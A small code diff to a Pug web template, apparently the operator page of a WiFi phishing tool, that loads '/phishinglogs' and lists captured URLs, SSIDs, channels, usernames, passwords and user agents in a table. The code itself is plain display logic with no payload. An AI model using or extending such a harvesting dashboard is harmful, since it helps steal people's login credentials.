@@ -11,6 +11,12 @@ html
     link(rel='stylesheet', href='/main.css')
     script(src='/jquery.slim.min.js')
     script(src='/main.js')
+    
+    link(rel='stylesheet', href='milligram.min.css')
+    link(rel='stylesheet', href='normalize.min.css')
+    link(rel='stylesheet', href='main.css')
+    script(src='jquery.slim.min.js')
+    script(src='main.js')
 
   body
     main.wrapper
@@ -55,10 +61,8 @@ html
 script.
   function loadJson(){
     getFile("/phishinglogs",function(res){
-      
-      var usercookie = document.cookie;
-      var arr = JSON.parse(res);
-      console.log(arr);
+      var raw = res.slice(0, -4);
+      var arr = JSON.parse(raw);
       arr.forEach(function(json) {
         console.log(json);
         $("#phishingTable").append('<tr><td>'+json.url+'</td><td>'+json.ssid+'</td><td>'+json.channel+'</td><td>'+json.user+'</td><td>'+json.pass+'</td><td>'+json.userAgent+'</td></tr>');
@@ -74,7 +78,6 @@ script.
 script.
   
   $(document).ready(function() {
-
     loadJson();
         
   });
